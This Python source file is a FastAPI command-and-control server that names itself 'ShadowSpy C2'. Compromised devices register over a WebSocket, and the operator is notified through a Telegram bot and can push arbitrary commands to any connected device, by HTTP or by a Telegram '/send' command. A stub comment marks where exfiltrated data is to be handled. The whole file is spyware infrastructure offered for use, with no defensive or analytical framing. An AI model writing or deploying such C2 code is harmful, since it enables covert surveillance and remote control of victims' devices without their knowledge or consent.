from fastapi import FastAPI, WebSocket
from fastapi.responses import HTMLResponse
import asyncio
import json
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

app = FastAPI()

# Telegram config - REPLACE THESE
TELEGRAM_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE'
CHAT_ID = 'YOUR_CHAT_ID_HERE'

bot = Bot(token=TELEGRAM_TOKEN)

connected_devices = {}

@app.get('/')
def home():
    return HTMLResponse('<h1>ShadowSpy C2 Server Running</h1>')

@app.websocket('/ws')
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    device_id = None
    try:
        while True:
            data = await websocket.receive_text()
            msg = json.loads(data)
            if 'device_id' in msg:
                device_id = msg['device_id']
                connected_devices[device_id] = websocket
                await bot.send_message(chat_id=CHAT_ID, text=f'Device connected: {device_id}')
            # Handle exfil
    except Exception as e:
        if device_id:
            connected_devices.pop(device_id, None)

async def send_command(device_id: str, command: str):
    if device_id in connected_devices:
        ws = connected_devices[device_id]
        await ws.send_text(json.dumps({'command': command}))
        return True
    return False

@app.post('/send_command')
async def send_command_endpoint(data: dict):
    success = await send_command(data.get('device_id'), data.get('command'))
    return {'status': 'sent' if success else 'device not connected'}

# Telegram handlers
def main_telegram():
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    application.add_handler(CommandHandler('send', lambda update, context: send_via_telegram(update, context)))
    application.run_polling()

async def send_via_telegram(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text('Usage: /send <device_id> <command>')
        return
    device_id = context.args[0]
    cmd = ' '.join(context.args[1:])
    success = await send_command(device_id, cmd)
    await update.message.reply_text('Command sent' if success else 'Failed')

if __name__ == '__main__':
    import uvicorn
    import threading
    threading.Thread(target=main_telegram, daemon=True).start()
    uvicorn.run(app, host='0.0.0.0', port=8000)